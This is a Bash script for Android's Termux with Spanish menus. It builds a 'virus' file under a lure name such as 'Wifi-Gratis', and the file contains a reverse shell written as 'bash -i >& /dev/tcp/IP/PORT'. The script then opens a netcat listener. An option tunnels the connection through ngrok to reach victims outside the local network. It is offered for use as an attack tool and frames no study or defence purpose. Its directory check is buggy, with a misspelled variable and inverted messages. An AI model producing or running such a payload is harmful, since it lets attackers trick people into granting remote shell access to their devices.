#! /bin/bash

clear
setterm -foreground red
figlet  Red "   >>>"
figlet  Socks " <<<"
echo ""
setterm -foreground white
echo "              Code by: MRX~HACKS"
echo ""
while :
do
#MENU
setterm -foreground yellow
echo "[1]Ataque dentro de la Red local"
echo "[2]Ataque fuera de la Red Lan"
echo -n "[+]Opcion >> "
read opcion
case $opcion in
1)
#! /bin/bash
echo ""
setterm -foreground green
echo "ATACANTE"
echo ""
echo -n "[+]IP >> "
read a
echo -n "[+]Puerto >> "
read b
echo -n "[+]Nombre del virus ej(Wifi-Gratis) >> "
read c
echo ""
DIRRCTORIO=/data/data/com.termux/files/home/storage/shared

if [ -d "$DIRECTORIO" ]
then
   echo -e "Directorio $blue(${DIRECTORIO}) $nc... $green no existe"
else
   echo "Directorio $blue(${DIRECTORIO}) $nc... $green existe"
rm -r /sdcard/Virus
fi

mkdir /sdcard/Virus
echo "
#! /bin/bash

bash -i  >& /dev/tcp/$a/$b 0>&1 & " > /sdcard/Virus/$c
echo "Enviar $c se guardo en una carpeta Virus en su /sdcard"


echo ""
echo "                    Welcome of Hacker      "
echo "                            "
echo "                        ╱▔▔▔▔▔▔▔▔╲              "
echo "                        ▏        ▕   "
echo "                       ▕ ╭━╮┈┈╭━╮▕             "
echo "                        ╲╰━╯╱╲╰━╯╱"
echo "             _    2023   ▏╮┈▔▔┈╭▕   By: MRX~HACKS "
echo "             | \__________┣╋╋╋╋┫___________________"
echo "          @8@8< ___________________________________\ "
echo "             |_/          ┣╋╋╋╋┫  "
echo "                         ╲▂▂▂▂▂▂╱ "
echo ""
nc -lvp $b
;;
#
2)
#! /bin/bash
setterm -foreground green
echo ""
echo "ATACANTE"
echo ""
echo -n "[+]Puerto >> "
read a
echo ""
nc -lvp $a &
echo ""
setterm -foreground white
echo "Abrir una nueva session y ejecutar"
echo "ngrok tcp $a"
echo "Copia la IP y el Puerto Ngrok"
echo ""
setterm -foreground green
echo -n "[+]IP NGROK >> "
read b
echo -n "[+]Puerto NGROK >> "
read c
echo -n "[+]Nombre del virus ej(Wifi-Gratis) >> "
read d
echo ""
DIRRCTORIO=/data/data/com.termux/files/home/storage/shared

if [ -d "$DIRECTORIO" ]
then
   echo -e "Directorio $blue(${DIRECTORIO}) $nc... $green no existe"
else
   echo "Directorio $blue(${DIRECTORIO}) $nc... $green existe"
rm -r /sdcard/Virus
fi

mkdir /sdcard/Virus
echo "
#! /bin/bash

bash -i  >& /dev/tcp/$b/$c 0>&1 & " > /sdcard/Virus/$d.sh
echo "Enviar $d.sh se guardo en una carpeta Virus en su /sdcard"


echo ""
echo "                    Welcome of Hacker      "
echo "                            "
echo "                        ╱▔▔▔▔▔▔▔▔╲              "
echo "                        ▏        ▕   "
echo "                       ▕ ╭━╮┈┈╭━╮▕             "
echo "                        ╲╰━╯╱╲╰━╯╱"
echo "             _    2023   ▏╮┈▔▔┈╭▕   By: MRX~HACKS "
echo "             | \__________┣╋╋╋╋┫___________________"
echo "          @8@8< ___________________________________\ "
echo "             |_/          ┣╋╋╋╋┫  "
echo "                         ╲▂▂▂▂▂▂╱ "
echo ""
nc -lvp $a
;;
#
esac
done

